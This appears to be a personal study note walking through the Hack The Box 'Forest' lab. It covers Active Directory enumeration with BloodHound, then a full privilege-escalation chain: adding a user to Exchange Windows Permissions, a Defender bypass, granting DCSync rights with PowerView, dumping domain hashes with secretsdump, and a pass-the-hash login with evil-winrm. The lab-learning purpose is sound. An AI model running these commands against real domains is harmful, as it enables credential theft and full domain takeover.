[[Forest.pdf]]
# Enumeration
---
- We can use bloodhound to have a graphical view
	- [[Domain Enumeration Bloodhound]]
- It's found that **svc-alfresco** is a member of nine groups through nested membership.
- We can **find nested groups using Bloodhound or using**:
	- `Get-ADGroup -Identity "GroupName" -Properties MemberOf | Select-Object -ExpandProperty MemberOf`
	- ![[Pasted image 20250425122741.png]]
	- ![[Pasted image 20250425115115.png]]
- One of the nested groups is found to be ==**Account Operators**== , which is a ==**privileged AD group.**==
	- ==**If `userA` is a member of a sub-nested group**, they **inherit all permissions** assigned to the **parent groups up the chain**.==
	- According to the documentation, **==members of the Account Operators group are allowed create and modify users and add them to non-protected groups.==** 
	- But, we ==`Account Operators`cannot modify `Administrators`==
		- ![[Pasted image 20250425120748.png]]
- Click on Queries and select **Shortest Path to High Value targets** 
	- ![[Pasted image 20250425115255.png]]
- One of the paths shows that the ==**Exchange Windows Permissions** group has `WriteDacl`== privileges on the Domain. 
- The ==**WriteDACL privilege gives a user the ability to add ACLs to an object.**== 
	- This means that **==we can add a user to this group and give them DCSync privileges.==**

# Exploitation
----
	![[Pasted image 20250425115545.png]]
- The commands above **create a new user named john and add him to the required groups.** 
	- `net user drasstrange password1 /add /domain`
	- `net group "Exchange Windows Permissions" drasstrange /add`
- Next, download the ==**PowerView script**== and import it into the current session
	- ![[Pasted image 20250425115622.png]]
		- The **Bypass-4MSI command** is used to evade defender before importing the script. 
			- `. .\PowerView.ps1`

- Next, we can use the **==Add-ObjectACL with john's credentials, and give him DCSync rights.==**
	- `$pass = convertto-securestring 'password1' -asplain -force`
	- `$cred = new-object system.management.automation.pscredential('htb\drasstrange', $pass)`
	- `Add-ObjectACL -PrincipalIdentity drasstrange -Credential $cred -Rights DCSync`
	- ![[Pasted image 20250425115821.png]]
- The **secretsdump script from Impacket can now be run as john**, and **used to reveal the NTLM hashes for all domain users**:
	- ![[Pasted image 20250425115856.png]]
	- `impacket-secretsdump 'htb.local/drasstrange:password1@10.10.10.161'`
		- ![[Pasted image 20250425123526.png]]
- Login using `evil-winrm`:
	- `evil-winrm -i 10.10.10.161  -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6`
	- ![[Pasted image 20250425123650.png]]